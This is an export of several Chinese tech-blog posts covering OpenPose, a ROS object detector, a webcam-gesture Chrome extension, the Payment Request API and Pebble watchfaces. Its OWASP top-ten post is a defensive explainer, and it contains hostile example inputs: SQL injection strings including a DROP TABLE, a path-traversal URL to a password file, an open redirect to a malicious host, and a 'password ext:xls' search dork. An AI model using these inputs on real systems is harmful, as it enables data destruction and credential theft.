# Import Openpose (Windows/Ubuntu/OSX)dir_path = os.path.dirname(os.path.realpath(__file__))try:# Windows Importif platform == &quot;win32&quot;:# Change these variables to point to the correct folder (Release/x64 etc.)sys.path.append(dir_path + &#x27;/../../python/openpose/Release&#x27;);os.environ[&#x27;PATH&#x27;] = os.environ[&#x27;PATH&#x27;] + &#x27;;&#x27; + dir_path + &#x27;/../../x64/Release;&#x27; + dir_path + &#x27;/../../bin;&#x27;import openpose_python as op

這時，你就可以去 cmd.exe 執行，執行下列步驟
::切換到你自己的 openpose 路徑cd openpose\build\examples\tutorial_api_pythonpython 1_body_from_image.py

然後跑出下面的結果：
總結今天跟大家介紹了 CMU 的 OpenPose 要怎麼安裝，也稍微介紹了 Python API 要怎麼使用，理論上學完這篇教學的內容後，你就可以用 Python 呼叫 OpenPose 的 API 來實作自己想要的更高階功能了。希望對你的研究或 project 有幫助！
延伸閱讀
Convolutional Pose Machines

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>Deep Learning</tag>
        <tag>Computer Vision</tag>
        <tag>OpenPose</tag>
      </tags>
  </entry>
  <entry>
    <title>一起來玩 OSRF 的 TensorFlow Object Detector</title>
    <url>/2018/02/24/osrf-tensorflow-object-detector/</url>
    <content><![CDATA[前言上次我們一起 使用 TensorFlow 來做簡單的手寫數字辨識，雖然我們可以自己使用這些 API 兜自己的模組，但我們也可以利用現成的工具，節省開發時間。
安裝安裝步驟可以參考官方的 README文件。我自己是在 Ubuntu 14.04 + Indigo 測試過，也 OK，只要記得將一些安裝 kinetic package 的地方更新成 indigo 就好。例如第二步的 camera dependencies：
sudo apt-get install ros-indigo-usb-cam ros-indigo-openni2-launch

真實環境測試安裝成功之後，立刻就來試試看真實環境下的測試結果，執行 launch 檔之後，應該就可以看到跳出如下視窗，顯示出辨識的物體。

我們都知道，要做 object recognition 有很多種不同的 neural network 可以用，這個 package 預設是使用 Single Shot Detector，SSD 主要的優點在於速度，根據他們在 PASCAL VOC、MS COCO、ILSVRC 等 Dataset 測試的結果，SSD 的準確度跟 region proposals 的方法差不多，但速度快很多。詳細介紹可以參考這篇文章。
換一個不同的 model接下來讓我們來嘗試換換，其實只要編輯 detect_ros.py 裡面的 MODEL_NAME 就好。首先，我們先到 tensorflow 的 detection model zoo，我下載了 ssd_inception_v2_coco 的 tar.gz 檔。把裡面的 model 解壓縮到 tensorflow_object_detector&#x2F;data&#x2F;models 後，再去改 detect_ros.py 裡面的 MODEL_NAME：
# What model to use#MODEL_NAME = &#x27;ssd_mobilenet_v1_coco_11_06_2017&#x27;MODEL_NAME = &#x27;ssd_inception_v2_coco_2017_11_17&#x27;


因為筆者在換 model 的時候，已經離拍上圖好一小陣子，所以上圖的香蕉已經被筆者吃掉，場景也變了。
那如果你是想要更新辨識物體的種類，那就更新 detect_ros.py 裡面的 LABEL_NAME，這就不贅述了。
總結今天我們玩了一個 OSRF 的 Object Detector，如果有想要做自己的機器人應用，需要用到物體辨識功能，不妨就直接拿這個 package 來用用，就算你覺得現有的 model 都不太好用，想自己重新 train 一個或 finetune 一個來符合自己的使用場景，也還是可以利用這個 package，抽換掉 model 就好，可以省下不少時間。
延伸閱讀
為什麼 SSD(Single Shot MultiBox Detector) 對小目標的檢測效果不好？

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>ROS</tag>
        <tag>TensorFlow</tag>
        <tag>Object Recognition</tag>
      </tags>
  </entry>
  <entry>
    <title>前端也能玩 Deep learning - 以 p5-deeplearn-js 為例</title>
    <url>/2018/01/13/p5ML-deeplearnjs/</url>
    <content><![CDATA[前言還記得約莫是 2012 年我還在唸研究所的時候，有位清大教授（原諒我忘了是哪位…）來系上演講關於類神經網路的應用，當時的我聽得霧煞煞，覺得是離我很遙遠的一門學問，而如今 Machine Learning、Deep Learning 滿天飛，說你沒聽過 KNN 就像說你沒背過 99 乘法表一樣驚人。
對於一個成天在網頁打滾的前端工程師，可能真的沒太多機會碰觸到相關實作或研究。但小心了！AI 的觸角也慢慢伸到前端的領域 - Screenshot to code in Keras，從圖片就能轉成 HTML，以後該怎麼辦啊…
你可能會想，身處於變化快速的前端領域，我們最擅長的不就是快速學習應對嗎？現在已經有很多 js 版本的機器學習函式庫啦，像是 Keras.js、Deeplearn.js 等等，讓你可以在 browser 上透過 WebGL 的幫助來使用 GPU 做運算。
但是這些 Library 的宗旨比較是拓展機器學習的應用層面，對於沒接觸過 Deeplearning 的前端工程師來說，要做出 teachablemachine 這樣的東西，其實沒這麼簡單。
而今天要介紹的這款 library 就是想提供一個 Higher level 的 js library，降低採用 Machine learning 實作產品的門檻。
先來看個 Demo：

Demo 裡是一個簡單的 Chrome extension，透過 WebCam 擷取圖片來分析，利用 KNN image classifier model，來判斷出不同動作，並對應到網頁上的互動，像是 scroll dow, scroll up 或是修改 DOM 元件（ Demo 中的開關燈效果 ）。主要參考自 deeplearn-chrome_extension。
沒有，我的另一隻手絕對沒有在下面控制滑鼠。
這一切的實現都是依靠 p5ML 與 deeplearnjs 的 knn image classifier。
p5MLp5ML 還持續在開發中，主要是提供一系列的 API wrapper，讓你能忽略掉一些直接使用 deeplearn.js 需要知道的細節，像是 NDArrayMath, Scalar, Array3D 等 deeplearn 提供的物件。
使用方式很簡單，直接在 html 中載入：
 &lt;script src=&quot;p5ML.min.js&quot;&gt;&lt;/script&gt;
 或是 npm install p5ML --save 下載皆可。
p5ML.min.js 會 expose 一個 p5ml 的全域變數，裡面提供以下幾種目前實作的 Modal 演算法：

LSTM
沒研究過 LSTM 的讀者可以看看這篇介紹，LSTM直觀理解


ImageNet - 目前只支援 SqueezeNet Modal
SqueezeNet 模型詳解


KNNImage
其中採用了 Deeplearn.js 的 knn models，寫得很簡潔，又是 Typescript，對於理解這種演算法很有幫助。


NeuralNetwork

除了 Neura Network 外，上述其餘每個 Modal 在 p5ML 的 github 上都有對應的 Demo，以及簡短的使用方式。
實作範例以剛剛開頭看到的例子來說，我們使用到的是 KNNImgae 這個 API：
let knn = new p5ml.KNNImageClassifier(callback);
建立出 KNNImageClassifier 的物件 knn 後，我們可以透過 knn.addImage(video, index); 來加入 example（video 變數)，並告知其 class 類別（index 變數）。當加入的 example 足夠多以後，就能透過 knn.predict(input, callback) 來預測 input 是屬於哪種類別：
knn.predict(video, function(data) &#123;    if (data.classIndex == 1) &#123;        // 屬於類別 1    &#125;&#125;);

使用起來就是這麼簡單。
整合 Extension - popup.js要整合到 Chrome extension 中的話，需要使用到的是 popup.js, popup.html, content.js 以及 option.html。
疑？為什麼需要 option.html？這次的範例應該還用不著需要使用者設定什麼參數吧？
原因是為了取得使用者的攝影機權限。
一般 Web 上是呼叫 navigator.mediaDevices.getUserMedia(options, callback)來取得使用者 WebCam 權限：
navigator.mediaDevices.getUserMedia(&#123; audio: true, video: true &#125;, function() &#123;  console.log(&#x27;ok&#x27;);&#125;, function(e) &#123;  console.log(&#x27;webcam not ok&#x27;);&#125;);
但要讓 Chrome extension 也拿到權限的話，你的這段程式碼，必須放置在由 extension 本身開啟的 html 內才可以，popup.html 不算。因此，利用設置頁面 option.html 是最為適合的，只要在你的 manifest.json 中設定：
manifest.json&quot;options_ui&quot;: &#123;    &quot;page&quot;: &quot;options.html&quot;,    &quot;chrome_style&quot;: true,    &quot;open_in_tab&quot;: true&#125;

之後就能透過開啟 Extension 的設定頁面，來徵求使用者的攝影權限。


取得權限後，在我們的 popup.html 中要繪製一些頁面元件，以供之後我們在前端進行 Image 的分類：
&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;video crossorigin=&quot;anonymous&quot; width=&quot;227&quot; height=&quot;227&quot; id=&quot;video&quot;&gt;&lt;/video&gt;  &lt;button id=&quot;still&quot;&gt;Do nothing&lt;/button&gt;  &lt;button id=&quot;up&quot;&gt;Up&lt;/button&gt;  &lt;button id=&quot;down&quot;&gt;Down&lt;/button&gt;  &lt;button id=&quot;turnoff&quot;&gt;Turn Off Light&lt;/button&gt;  &lt;script src=&quot;scripts/p5ml.js&quot;&gt;&lt;/script&gt;  &lt;script src=&quot;scripts/popup.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;

popup.js 中則是放入最主要的 knn 相關程式碼：
popup.jslet knn = new p5ml.KNNImageClassifier(modelLoaded);let turnoffButton = document.getElementById(&#x27;turnoff&#x27;);// turnoffButtonturnoffButton.addEventListener(&#x27;click&#x27;, function () &#123;    knn.addImage(video, 4);    times++;&#125;)setInterval(function() &#123;    if (times &gt; 10) &#123;        knn.predict(video, function(data) &#123;            if (data.classIndex == 1) &#123;                console.log(&#x27;response&#x27;, &#x27;still&#x27;);            &#125; else if (data.classIndex == 2) &#123;                // ...            &#125; else if (data.classIndex == 3) &#123;                // ...            &#125; else if (data.classIndex == 4) &#123;                chrome.runtime.sendMessage(&#123; direction: &quot;turn off&quot; &#125;, function (response) &#123;                console.log(&#x27;response&#x27;, &#x27;turn off&#x27;);                &#125;);            &#125;        &#125;);    &#125;&#125;, 1500);

Line 1 我們初始化 p5ml.KNNImageClassifier 物件 knn，接著在 turnoffButton 按下時加入範例 knn.addImage(video, 4)，並設定該範例類別為 4。
接著在 Line 8 開始，利用 setInterval() 不斷的進行 knn.predict()，這樣就能盡量即時分辨 WebCam 傳來的資料。
其他部分，像是如何讓 WebCam 的影像顯示在 &lt;video&gt; tag 中的程式碼也是在 popup.js 中實作。
完整 popup.js 程式碼可以看 這裏 或是原作者的
實作到這裡以後，基本上你就可以開啟 Extension 然後進行一些影片的分類，像是這樣：

可以從上面的片段發現，你需要點擊對應分類的按鈕，並且做出你想要的動作來教導你的 extension，讓他認得你的手勢！當你給予的 example 越多，就愈有機會判斷得更好。
整合 Extension - content.js這邊假定大家都知道 Extension 的實作方式（如果不知道可以從這邊學習）。
在 Extension 中，可以透過 chrome.runtime.sendMessage() 與 chrome.runtime.onMessage.addListener() 來針對 Popup page 與 當前頁面的 content script 進行溝通，我們就是利用這點來將辨識完的手勢，轉換成頁面上的互動操作：
content.jschrome.runtime.onMessage.addListener(gotMessage)function gotMessage(message, sender, sendResponse)&#123;  let direction = 0;  if(message.direction == &#x27;up&#x27;)&#123;    direction = -500;  &#125; else if(message.direction == &#x27;down&#x27;)&#123;    direction = +500;  &#125; else if (message.direction == &#x27;turn off&#x27;) &#123;    const mask = document.getElementById(&#x27;body-maskDiv&#x27;);    if (mask) &#123;      removeMask();    &#125; else &#123;      addMask();    &#125;  &#125;  window.scrollBy(&#123;     top: direction,    left: 0,     behavior: &#x27;smooth&#x27;   &#125;);&#125;

到這邊為止基本上就完成了範例的所有功能，對完整程式碼（或是遮罩實作方式 XD）有興趣的人可以從這邊取得。
結論這次算是初步嘗試在前端上應用 ML 相關的功能，介紹大家有像是 p5-deeplearn-js 這樣有趣的 library 可以使用，希望可以有多一點的前端高手來發揮創意，並分享作品出來，不然真的很難找到相關的經驗分享。不過當然，這只是個非常粗淺的應用，更是用非常 High level 的 API 來實作，還是需要真正去了解 ML 相關的演算法，才是比較正確的學習方向，接下來我也會繼續學習，p5-deeplearn-js 會是一個不錯的起點，加上 deeplearn.js 的 KNN 演算法程式碼都算蠻簡潔的，以 Typescript 實作，閱讀起來比起純 JS 好理解一些（多了 Type 很有幫助啊！），推薦給各位！

資料來源
p5-deeplearn-js
deeplearn-chrome_extension
deeplearnjs

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>deeplearnjs</tag>
        <tag>deeplearning</tag>
        <tag>p5ML</tag>
        <tag>chrome extension</tag>
      </tags>
  </entry>
  <entry>
    <title>Top issues on OWASP</title>
    <url>/2017/05/07/owasp/</url>
    <content><![CDATA[今天來講講 web application security。基本上這篇講的是所有開發者都要知道的最基本知識。最近電腦工程領域實在太過火紅，網頁開發更是前仆後繼，但並不是每個開發者都對網路安全有 sense，如果你搜尋 “password ext:xls” 就會發現挺多不可思議的連結。

但誰無年少，誰不輕狂。看完後把冷汗擦一擦，讓這篇文章介紹目前最常見的幾個安全問題。
OWASP講到網路安全一定要知道的 Project OWASP: Open Web Application Security Project。裡面介紹了各種不同的網路安全問題、每幾年的十大安全問題排名跟範例，完全免費，基本上是所有做 security 的聖經。
值得一提的是他們每幾年就會統計最常見的網路安全問題，先來看一下 2010 的跟 2013 的( 2013 是最新的 list )。


基本上榜上有名的都挺固定的，劉伯溫說忠臣要比奸臣更奸，要擋住駭客的唯一方式就是比駭客厲害。今天就來瞭解一下這些到底是什麼。以下的 code sample 主要來自於 AppsecTutorialSeries。
A1: SQL Injection其實 Injection 包含了很多種，除了 SQL injection 之外還有 code injection、os command injection、xml injection 等等。但最惡名昭彰的當然就是 sql injection。簡單的 code 如下
void queryDB(string name)&#123;	string sql = &quot;select * from users where name = &#x27;&quot; + name + &quot;&#x27;&quot;;	doQuery(sql);&#125;

很好，簡單易懂。
如果 server 拿到的 name 是 John，那 sql 就是 “select * from users where name &#x3D; John”。
如果 server 拿到的 name 是 Steve，那 sql 就是 “select * from users where name &#x3D; Steve”。
如果 server 拿到的 name 是 John or 1 &#x3D; 1，那 sql 就是 “select * from users where name &#x3D; John or 1 &#x3D; 1”。
這下 high 了，因為 where 的 condition always true。第三個 sql 回傳 database 的所有 row 的所有 column。

現在還笑得出來，那要是 server 拿到的 name 是 **John;DROP TABLE users;**。

要是這真的發生了怎麼辦，別怕！這時候還有一個辦法，趕快上這個網站 Linkedin 找份新工作吧！你的 user 都不見了。
同樣的 case 可以 apply 到很多地方。如果你把使用者輸入給你的東西原封不動拿去 run os command line 就是 command injection。把 user 輸入給你的東西原封不動寫進 log 就會有 log injection。很多初出茅廬的 developer 不知道或是忘記預防 injection 的問題，這也是為什麼 injection 是 OWASP 多年來的不動榜首。
SQL Injection 預防最基本的一件事情就是把你 web server 的 error log 關起來(不要 return 給 client)。不要讓任何訊息洩露。如果你沒關起來，hacker 大概隨便試兩次就知道你的 table name 了。
然後要怎麼防呢？當然就是要好好 validate user input。在 CS 領域有個用來嚇初學者的冠冕堂皇的名詞，叫做 parameterized query。
其實概念也很簡單，就是你 server 端先把你的 sql query 寫好。至於 username 之類的變數呢？就等 validate 之後再丟進去，好處就是 code 有 code 的 syntax 跟允許的 character，data 有 data 的 syntax 跟允許的 character，code 跟 data 分清楚你之後的 test 也會比較好寫。
至於各種語言怎麼 implement 請參考 Query Parameterization Cheat Sheet
A2: Broken Authentication and Session Management這個 category 包含所有的盜帳號，不論你帳密是被猜到還是被竊聽到都算。
這裡要先介紹 session，session 可以抽象的想成 client 跟 server 的一次 conversation，每次的 conversation 開始的時候會先問帳密，認證了之後會生成一個 session id，也就是這次對話的 id。只要是同一個 session id 你就不需要每傳一次訊息都重新登入。
懂了之後呢，開始介紹這個類型的可能被攻擊的點。這個 category 有幾種類型：
1.傳輸未加密，傳輸內容被中間人竊聽。之前都有提過，解法就是用 https 或 ssh。
2.session 在 user 登出之後沒有清理掉，或是 session id 不會 time out，更慘的是 session id 直接寫在 URL 裡面。比如說：
http://example.com/myprofile?sessionid=abcde

任何人只要拿到這個 session id，他根本不用知道你的帳密，就可以直接假裝是你，把你戶頭的錢轉走之類的。
3.存密碼的時候沒有 hash 或是 hash 的時候沒有 add salt。關於資料庫密碼存儲安全問題可以參考 用什麼樣的密碼比較安全呢 可以暴力硬破。
A3: Cross-Site Scripting(XSS)XSS 是 injection 的一種。也就是 Script injection。那為什麼要從 Injection 的 category 單獨出來呢？因為剛剛 A1 講的 Injection 的攻擊目標是 server。比如 SQL injection 的目標是 database server、command injection 的目標是 webserver 等等。但 XSS 的目標是其他使用者。
那要怎麼 inject 呢？也是很簡單，比如說一個網站的某頁有很多 comments。每個人都可以寫 comment，而且寫的 comment 都會被其他人看到。 
那今天如果 hacker 也寫了 comment，
I like this post&lt;script&gt;/*Bad code*/&lt;/script&gt;

因為 webserver 會 load 所有 comment 給所有在瀏覽這一頁的 user，所以這個 script 就會被執行。而且 user 不知道(因為 html 不會 show script tag)，那你想得到的 javascript 能做的事他都能做了，偷 cookie、session 或是覆蓋一個假的 login panel 在真的 login panel 上。你帳密輸入完就直接傳到 hacker 的 server 去，完全看不出來，因為你 browser 的網址是正確的。
inject 到 HTML element 只是其中一種可能，也可能 inject 到 html tag 的 attribute，也可以 inject 到 CSS，也可以inject 到網站要 redirect 的 URL。
Cross-Site Scripting 預防XSS Prevention Cheat Sheet洋洋灑灑寫了 7 個 rule，但其實 Rule#0 最重要。就是好好 validate 所有的 user input，剩下的都是防禦各個可能被 inject 的點的實作細節。
A4: Insecure Direct Object Reference如果 server 直接用 user 給的變數去 access 檔案，就可以去猜 server 存其他檔案的檔名或資料夾，舉個例子：
http://example.com/showimage?image=img1
這是網站要給你看的 image1 的 link，那你想看 img2 就直接把後面改成 img2，如果可以看得到那就是 A4。
更慘的是如果允許輸入這種：
http://example.com/showimage?image=../../password/password.txt
那就更精彩了。
Insecure Direct Object Reference 預防Access control 也就是每個檔案的存取權限設定好，或是最重要的 validate user input。
A5: Security Misconfiguration像是你安裝一個 database，會有 default 的帳密比如說 user: admin，密碼: admin 你沒有把它拿掉，或是 server error 的時候你把所有 error message 全部傳給client。
Security Misconfiguration 解法
認真看doc。

所有檔案等等的權限都開到最低，不需要的 port 都關掉，只提供需要提供的東西。


A6: Sensitive Data Exposure傳輸未加密或密碼沒有用 hash 或沒有加 salt：老問題
A7: Missing Function Level Access Control網頁沒有做好 access control，比如說一些 webserver 的 default path：
&#x2F;log
&#x2F;phpmyadmin 
&#x2F;admin等等，這些權限沒關就屬於這類。
有沒有開始覺得都大同小異了。
A8: Cross Site Request Forgery這個比較有名，我覺得排在 A8 算是低估它了，因為通常這個攻擊如果成功了，傷害會比較巨大。
基本上我們跟 server 能做的互動，取決於 server 開放給我們的權限。比如說 A 可以轉錢到別人信箱，可是不能改 B 的密碼，也不能把 C 的錢轉給自己。
可是今天要是有權限的話就不一樣了，什麼時候會有權限呢？就是你的 cookie&#x2F;session 還有效的時候(比如你現在開 facebook 不用輸入密碼，因為你 cookie 還有效)，讓你在你不知情的情況下送 http request。
這就是你很常收到垃圾郵件或惡意郵件的時候，他都會要你點個 link，那絕不是只是要你點廣告衝流量而已。如果你點了，剛好你另外一個網站(比如銀行)的 cookie 沒有到期，他就可以假裝是你，送 http request。
CSRF 解法
一個 request 過來前先看一下他的 header，先看 Origin 的值跟現在這個網頁的網址或 Domain 一不一樣，沒有 Origin 值就看 Referer值。不一樣的話就很可能是CSRF。

對於非 get 的重要 request，要求提供驗證碼，或是重新驗證使用者。


A9: Using Components with Known Vulnerabilities就是你用了不安全的第三方軟體，明明他們已經承認有問題了你還不換或不更新，就會被攻擊。
A10: Unvalidated Redirects and Forwards有些 request 會把使用者導到其他網站或頁面，他直接抓取網址的 url 的 parameter 來 redirect，就很好被攻擊。因為任何人都可以 fake http request 裡的 parameter。比如說如果你的網站有一個會自動 redirect 的 code：
response.sendRedirect(request.getParameter(&quot;url&quot;));

那 hacker 就可以生一個超連結給你的使用者。
http://example.com/example.php?url=http://malicious.example.com
你的使用者看到網址前面，選擇信任你。但是你卻把他導到惡意網站，身敗名裂。
Unvalidated Redirects and Forwards 解法就是乖乖 validate，不然就不要 redirect。
總結做學問最重要的就是總結，異中求同，同中求異。
A1 A4 A7 A10: user 的 input 可能是惡意的，網址亂打、檔案亂存取等等。
A2 A6: 密碼學沒學好。
A3 A8: 偷偷拿你的 cookie&#x2F;session 做壞事。
A5 A9: 乖乖看 doc 乖乖更新。
我認為這主題的投資報酬率實在是挺高的，因為重要的問題都是換湯不換藥，即使之後會出新的top10也大概就是這十項再交換順序。如果有幾項沒聽過，總覺得跟人家聊天搭不上話，手腳不好施展。這篇文章的都看懂就夠了，真的有需要寫 server 的時候你再去深入研究細節即可。
延伸閱讀
網路安全(1) - 基礎密碼學
用什麼樣的密碼比較安全呢

關於作者：@jyt0532 後端工程師，喜歡學習新知挑戰新事物，最近覺得 Anti pattern 比 Design pattern 有趣。
]]></content>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>統一網頁支付介面：Payment Request API</title>
    <url>/2017/10/14/payment-request-api/</url>
    <content><![CDATA[前言之前在 Hacker News 上面看到了這一篇文章：Payment Request API — Now Being Implemented in All Major Browsers，大意就是 Payment Request API  這一個東西將會在主流瀏覽器上面被實作出來。
在這之前，我完全沒有聽過這個東西，完全不知道它在做什麼。但經過我稍微研究之後，發現這個原來是網頁支付介面的未來。
Payment Request API 簡介在瞭解一項新事物以前，我習慣先從「目的」下手，如果你知道這個東西是為了解決什麼問題而誕生，就能對它有最基本的了解。
而 Payment Request API 誕生的原因很簡單，就是為了解決支付問題，尤其是在手機上的支付。
先不要談手機，我們先來談電腦端的支付就好。
現在每個購物網站都有不同的支付介面，串接著不同的金流廠商。假設我今天在蝦皮買了《純粹理性批判》，填了信用卡號碼與收貨地址，蝦皮貼心的幫我記住，於是下一次我再購物時，就不必再填收貨地址了。
可是，如果今天 PChome 商家砸錢放送各種優惠，我決定轉到 PChome 上面購物，我買了一本《夢的解析》，就要再填了一次信用卡號碼跟收貨地址。
問題是什麼？
問題是每一間公司、每一個網站的結帳流程跟介面都不一樣，雖然大同小異，可是那些資料都是沒有辦法共用的。就算我在 100 個網站都填了收貨地址，我在第 101 個網站還是要重新填一次，因為他沒有我的資料。
上面講的是每一個網站有差異的地方，那有任何相同的地方嗎？
有，那就是你都用同一個瀏覽器購物。
瀏覽器的初次嘗試：自動填入上面說的情景其實不太準確，因為你應該會發現其實瀏覽器會自動幫你記憶地址跟信用卡，就可以很方便地使用自動填入的功能。
例如說刷卡的時候只要刷過一次，就可以讓 Chrome 把這一張的卡的資訊記在瀏覽器裡面，下次再到別的網站刷卡時，你只要點一下輸入卡號的輸入框，Chrome 就會提示你說可以用之前的那張卡來付費。
地址也是如此，都有瀏覽器幫你記憶起來，這樣你就只要填一次之後，之後都可以由 Chrome 幫你自動填入。
可是，這樣還有一個問題，那就是結帳的流程跟介面還是不統一，大家都有自己不同的實作，有的支付介面簡直慘不忍睹，尤其是在手機上！
根據 Google 的統計，有 65.9% 的使用者在手機上購物時，還沒完成所有流程就離開了。這已經超過一半的用戶了，代表許多網站在手機的支付介面這一塊還有很大的努力空間。
而這一次，瀏覽器決定自己跳下來解決這個問題。
瀏覽器：都交給我吧！瀏覽器要怎麼解決這個痛點？
簡單！只要由瀏覽器提供一個統一的結帳介面就好，連流程都一併統一。商家的網頁可以根據需求的不同，帶入不同的參數，但最終都是呼叫瀏覽器提供的 API（也就是我們今天的主角：Payment Request API），叫出瀏覽器原生的介面。
當這個 API 普及並且大家都發現比較好用的時候，所有的網頁都會跟進，都會採取一樣的方式。這樣就能夠確保所有網站的支付流程都統一了。
所以 Payment Request API 到底是什麼？
簡單來說，就是瀏覽器提供的 API，當網頁端以 JavaScript 呼叫以後，就會出現瀏覽器原生的結帳介面，用來取代原有的商家自有的結帳流程。

直接讓你看一張圖就會理解了：

這個就是呼叫 API 之後的樣子。
要特別注意的一點是 Payment Request API 跟後端「完全無關」，你後端就跟以前一樣接收資料即可。有變動的地方是前端，原本你在前端需要寫的那些結帳頁面，都可以交由瀏覽器來 render 原生的 UI，你只要負責呼叫 Payment Request API 即可。
呼叫以後可以拿到使用者填入的那些資料，把那些資料像以前一樣發送到 Server 端就好。
但要注意的是這個 API 還不普及，根據 caniuse.com 的資料，只有 Chrome 61 版、Edge 15 跟 Opera 48 以上才支援，其他的瀏覽器還要再等等。
使用流程說了這麼多，現在就來實際跑一次流程吧！
我們先建立一個簡單的 demo 頁面，偵測是否支援 Payment Request 以及放置購買按鈕跟回傳的結果：

第一步：創造 Payment Request 物件PaymentRequest接受三個參數，付款方式、交易資訊跟其他。
var request = new PaymentRequest(  methodData, // 支援的付款方式  details,    // 交易相關的詳細資訊  options     // 其他，例如說運送方式等等);

我們先實作一個簡單的 function 回傳建立好的 PaymentRequest：
function createPaymentRequest () &#123;  var methodData = [&#123;    supportedMethods: [&#x27;basic-card&#x27;], // 支援信用卡    data: &#123; // 指定更詳細的資訊      supportedNetworks: [&#x27;jcb&#x27;, &#x27;mastercard&#x27;, &#x27;visa&#x27;],       supportedTypes: [&#x27;debit&#x27;, &#x27;credit&#x27;, &#x27;prepaid&#x27;]    &#125;,  &#125;];  var details = &#123;    displayItems: [ // 購買的品項      &#123;        label: &quot;TechBridge Weekly 專業版一年份&quot;,        amount: &#123; currency: &quot;TWD&quot;, value : &quot;3000.00&quot; &#125;      &#125;,      &#123;        label: &quot;早鳥優惠&quot;,        amount: &#123; currency: &quot;TWD&quot;, value : &quot;-300.00&quot; &#125;      &#125;    ],    total:  &#123;      label: &quot;總額&quot;,      amount: &#123; currency: &quot;TWD&quot;, value : &quot;2700.00&quot; &#125;    &#125;  &#125;;    return new PaymentRequest(methodData, details);&#125;

這邊有一點要特別注意，那就是total那邊的總額，系統「不會幫你自己算好」，所以儘管上面總和是 2700，你要輸入其他數字也可以。
還有另一個條件是這個 API 不支援退款，所以總和必須是正數。但是每一個品項可以是負數，這樣就可以放一些折扣相關的東西。
第二步：呼叫 API，顯示結帳頁面建立完 PaymentRequest 之後，可以用.show()顯示結帳 UI，會回傳一個 Promise，使用過後可以拿到使用者的相關資料。我們在購買按鈕按下去之後來進行結帳流程。
function onClick () &#123;  var request = createPaymentRequest();  request.show().then(function(PaymentResponse) &#123;    handleResponse(PaymentResponse);  &#125;).catch(function(err) &#123;    console.log(err);  &#125;);&#125;

第三步：處理資料及回傳結果最後一步就是處理上一步拿到的資料，把那些資訊發送到 Server 去完成結帳流程，並且傳回結果，讓 UI 顯示成功或是失敗。我們在這邊只是範例，所以就省略上述步驟，並且直接把上一步拿到的資料轉成 JSON 顯示出來。
function showResponse (response) &#123;  $res.innerHTML = JSON.stringify(response, undefined, 2);&#125;  function handleResponse (paymentResponse) &#123;  // 可以在這裡把結果回傳 server  // 只是示範，所以我們直接將資料顯示出來  showResponse(paymentResponse);  // 模擬 API 的延遲  setTimeout(function () &#123;    // 結帳成功    paymentResponse.complete(&quot;success&quot;);  &#125;, 2000);&#125;


（這邊的卡號是我在 http://www.getcreditcardnumbers.com/ 隨便產生的）
只要上面簡單的三個步驟，就能夠取得使用者的資料並且完成結帳。比起原先每個網站建立的自有結帳流程，使用 Payment Request API 的好處就是可以帶給使用者原生的結帳體驗，進而增加轉換率。
而上面的三個步驟，最重要的就是第一個帶入參數的部分，這邊還有很多細節可以調整，例如說貨幣種類、要求運送地址，並且可以根據使用者選擇的地址判斷接受或是不接受（例如說不接受送貨到國外，就能在那邊判斷）。
支付方式也可以指定某幾間的信用卡，或甚至是決定要不要支援 debit card。
如果你對這些細項有興趣，可以參考 Google 提供的非常詳細的教學：Deep Dive into the Payment Request API。
原生結帳 UI如果你想自己跑一遍結帳流程，可以直接去 demo 網頁 試試看。
在這邊我直接截圖給大家看在電腦以及手機上面的結帳流程。
電腦按下按鈕之後的畫面：
點進訂單摘要：
新增信用卡：
新增地址：
按下支付之後，要求輸入末三碼：
結帳失敗：
手機按下按鈕之後的畫面：
點進訂單摘要：
新增信用卡：
新增地址：
結帳失敗：
總結Payment Request API 正在被其他瀏覽器（例如說 Safari）實作，可以預期到將來必定會被廣泛支援。
其實國外的金流廠商 Stripe 已經支援使用 Payment Request API 了。而 PaymentRequest Sample 這個網站也可以看到更多樣化的範例。
這篇文章主要目的是把這項新的標準帶到大家面前，如果覺得很有興趣想要深入研究，底下有附上許多相關資源。
參考資料：

MDN - Payment Request API
Deep Dive into the Payment Request API
Introducing the Payment Request API
PaymentRequest Credit Cards Sample
w3c&#x2F;payment-request-info FAQ

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>payment request</tag>
      </tags>
  </entry>
  <entry>
    <title>一小時內製作自己的 Pebble 錶面</title>
    <url>/2016/11/19/pebble-rocky-watchface/</url>
    <content><![CDATA[筆者「最近」買了一隻 Pebble 2，大概是半年多前的事情…當初看上他便宜信譽好，又可以用 javascript 撰寫自己的 watch face，所以就刷下去了，算是第一次在 kickstarter 上面贊助產品，等待的時間久到我都快忘了….才怪，我大概每個月都會想起來一次 XD
總之，經過幾個月漫長等待，以及網站上跟我一樣想趕快拿到產品的 baker 們不斷地詢問下，終於還是送到我手上了！
Tada ~!
…不對這篇不是開箱文
我今天要來簡介一下如何用 Pebble 提供的 Rocky.js Javascript API 來開發 Pebble watchface，讓你可以安裝到自己的手錶上！
Build your very first pebble watchfacePebble 的官網內容蠻豐富的，從簡單的教學、API Doc 到使用者論壇與 blog 都有。


Pebble 上頭的 app 基本上都是以 C 語言撰寫為主，而距離我上次寫 C 大約是臉書還沒在台灣出現的時代…不過沒關係，Pebble 沒有捨棄 Javascript 這個強大的語言，我們還能利用 Javascript API 與 官方出的 Rocky.js 來撰寫 Pebble watchface！(只是目前不支援 ES6)
然而，工欲善其事，必先利其器，開發 iOS 我們會想到 Xcode，開發 Android 我們有 Andriod studio，開發 Pebble 呢？
IDE - Cloudpebble

雖然你也可以透過 command line 去編譯 Pebble 的程式，但我還是要推薦跟介紹他們的雲端 IDE，因為整合得蠻好的，只要以 Pebble 的帳號登入（一開始設定你的手錶時就會要求你註冊），就可以無痛連接你的手機與 Pebble watch。即便開發體驗上面還有許多可以加強的部分，但是已經是非常方便的工具了，而且還有中文！
Start a new project

當你登入後可以看到很簡單的介面，列出目前擁有的專案，按下建立按鈕來新增。


